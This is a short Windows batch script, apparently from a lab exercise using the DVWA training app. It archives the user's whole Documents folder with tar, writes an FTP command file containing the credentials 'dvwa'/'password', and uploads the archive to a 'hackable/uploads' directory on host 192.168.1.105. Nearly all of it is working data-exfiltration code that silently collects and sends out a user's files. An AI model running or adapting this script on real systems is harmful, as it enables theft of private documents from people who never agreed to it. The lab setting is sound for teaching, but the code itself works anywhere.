@echo off
cls
echo Date format = %date%
echo dd = %date:~7,2%
echo mm = %date:~4,2%
echo yyyy = %date:~10,4%
echo.
echo Time format = %time%
echo hh = %time:~0,2%
echo mm = %time:~3,2%
echo ss = %time:~6,2%
echo.

set objfilename=objective-%date:~10,4%%date:~4,2%%date:~7,2%

echo %objfilename%
tar -zcvf %HOMEDRIVE%%HOMEPATH%\Downloads\%objfilename%.tar "%HOMEDRIVE%%HOMEPATH%\Documents"

echo dvwa> %HOMEDRIVE%%HOMEPATH%\Downloads\t.txt
echo password>> %HOMEDRIVE%%HOMEPATH%\Downloads\t.txt
echo cd hackable/uploads>> %HOMEDRIVE%%HOMEPATH%\Downloads\t.txt
echo send %HOMEDRIVE%%HOMEPATH%\Downloads\%objfilename%.tar>> %HOMEDRIVE%%HOMEPATH%\Downloads\t.txt
echo quit >> %HOMEDRIVE%%HOMEPATH%\Downloads\t.txt

ftp -s:%HOMEDRIVE%%HOMEPATH%\Downloads\t.txt 192.168.1.105